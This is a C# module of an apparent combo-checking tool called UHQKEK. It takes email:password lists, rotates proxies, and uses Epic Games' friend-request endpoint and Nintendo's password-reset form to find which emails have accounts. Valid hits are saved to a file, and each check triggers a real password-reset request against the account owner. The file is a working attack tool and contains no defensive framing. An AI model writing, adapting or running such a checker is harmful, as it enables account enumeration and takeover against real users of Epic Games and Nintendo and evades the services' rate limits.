using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class FortVm
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "fr-FR,fr;q=0.9");
                httpRequest.AddHeader("Connection", "keep-alive");
                httpRequest.AddHeader("Host", "www.epicgames.com");
                httpRequest.AddHeader("sec-ch-ua", "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
                httpRequest.AddHeader("X-Epic-Event-Action", "login");
                httpRequest.AddHeader("X-Epic-Event-Category", "login");
                httpRequest.AddHeader("X-Epic-Strategy-Flags", "minorPreRegisterEnabled=true;guardianKwsFlowEnabled=true");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");

                string str1 = httpRequest.Get("https://www.epicgames.com/id/api/csrf").ToString();
                string csrf = httpRequest.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].ToString();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "fr-FR,fr;q=0.9");
                httpRequest.AddHeader("Connection", "keep-alive");
                httpRequest.AddHeader("Host", "accounts.launcher-website-prod07.ol.epicgames.com");
                httpRequest.AddHeader("Origin", "https://accounts.launcher-website-prod07.ol.epicgames.com");
                httpRequest.AddHeader("Referer", "https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/addFriends");
                httpRequest.AddHeader("sec-ch-ua", "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
                httpRequest.AddHeader("X-XSRF-TOKEN", ""+csrf);

                string str2 = httpRequest.Post("https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/sendFriendRequest", "inputEmail="+strArray1[0]+ "&tab=connections", "application/x-www-form-urlencoded").ToString();

                if (str2.Contains("fieldValidationError\">Veuillez vous connecter"))
                {
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    httpRequest.AddHeader("Accept", "*/*");
                    string str3 = httpRequest.Get("https://accounts.nintendo.com/password/reset").ToString();
                    string csrfp = Cryptography.LR(str3, "csrfToken&quot;:&quot;", "&quot").FirstOrDefault();

                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("User-Agent", ": Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                    httpRequest.AddHeader("Accept", "*/*");
                    string str4 = httpRequest.Post("https://accounts.nintendo.com/password/reset", "address="+strArray1[0]+ "&post_password_reset_redirect_uri=https%3A%2F%2Faccounts.nintendo.com%2F&csrf_token="+csrfp+"", "application/x-www-form-urlencoded").ToString();

                    if(str4.Contains("&quot;,&quot;postPasswordResetRedirectUri&quot;:&quot;https://accounts.nintendo.com/&quot;,&quot;showNav&quot;:false}' class=\"t-displayNone\"></div>"))
                    {
                        Interlocked.Increment(ref Program.Fail);
                        Interlocked.Increment(ref Program.Check);
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[-]" + combo, Color.Red);
                        }
                        ////Program.Save(combo, "Invalids");
                        return true;
                    }
                    else
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Green);
                        }
                        Program.Save(combo, "Nintendo Fortnine VM");
                        return true;
                    }
                }
                else if (str2.Contains("compte est introuvable"))
                {
                    Interlocked.Increment(ref Program.Fail);
                    Interlocked.Increment(ref Program.Check);
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Error;
                    return false;
                }
            }
            catch
            {
                ++Program.Error;
                return false;
            }
        }
    }
}
